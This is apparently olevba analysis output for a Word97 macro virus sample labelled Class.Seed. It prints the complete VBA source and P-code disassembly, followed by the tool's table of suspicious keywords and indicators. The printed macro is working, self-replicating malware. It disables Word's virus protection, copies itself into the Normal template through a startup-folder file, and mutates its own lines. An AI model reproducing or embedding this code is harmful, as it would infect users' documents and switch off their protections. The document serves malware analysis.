olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Randomize

s = 0: r = 0

On Error GoTo 87

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If xf > 90 And fx > 0 Then GoTo 87

If xf < 90 Then

    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name

    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)

End If

If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)

k = Int(Rnd(1) * 100) + 1

If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)

l = Int(Rnd(1) * 75) + 1

If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)

m = Int(Rnd(1) * 50) + 1

If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

n = Int(Rnd(1) * 25) + 1

If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)

xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)

With xs.codemodule

    For poly = 1 To 4

    .deletelines 1

    Next poly

End With

If xf < 90 Then

    With xs.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 93, "Sub ToolsMacro()"

    End With

End If

With xs.codemodule

    For poly = 2 To 92 Step 2

    r = Int(Rnd(412835) * 203989) + 8485

    s = Int(Rnd(384958) * 285865) + 2988

    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r

Next poly

End With

87:

If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()
'Word97/Class.Seed by Virus :)
End Sub


















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.x
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5487 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' Line #4:
' 	LitDI2 0x0000 
' 	St s 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #5:
' Line #6:
' 	OnError 87 
' Line #7:
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St fx 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xf 
' Line #17:
' Line #18:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 87 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Lt 
' 	IfBlock 
' Line #21:
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' Line #23:
' Line #24:
' 	Ld xs 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' Line #26:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' 	EndIf 
' Line #31:
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #33:
' Line #34:
' 	Ld k 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x001E "http://www.cannabisculture.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #35:
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #37:
' Line #38:
' 	Ld l 
' 	LitDI2 0x004A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0018 "http://www.Microsoft.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #39:
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' Line #41:
' Line #42:
' 	Ld m 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #43:
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #45:
' Line #46:
' 	Ld n 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #47:
' Line #48:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld xs 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' Line #50:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #53:
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #55:
' Line #56:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' Line #58:
' 	EndWith 
' Line #59:
' Line #60:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Lt 
' 	IfBlock 
' Line #61:
' Line #62:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #63:
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' Line #66:
' 	LitDI2 0x005D 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' Line #68:
' 	EndWith 
' Line #69:
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #73:
' Line #74:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x005C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #75:
' Line #76:
' 	LitDI4 0x4CA3 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x1CD5 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St r 
' Line #77:
' Line #78:
' 	LitDI4 0xDFBE 0x0005 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x5CA9 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St s 
' Line #79:
' Line #80:
' 	Ld poly 
' 	LitStr 0x0001 "'"
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld s 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Ld s 
' 	Mul 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld s 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' Line #82:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' Line #84:
' 	EndWith 
' Line #85:
' Line #86:
' 	LineNum 87 
' 	BoS 0x0000 
' Line #87:
' Line #88:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #89:
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
' 	FuncDefn (Sub ViewVBCode())
' Line #93:
' 	QuoteRem 0x0000 0x001D "Word97/Class.Seed by Virus :)"
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

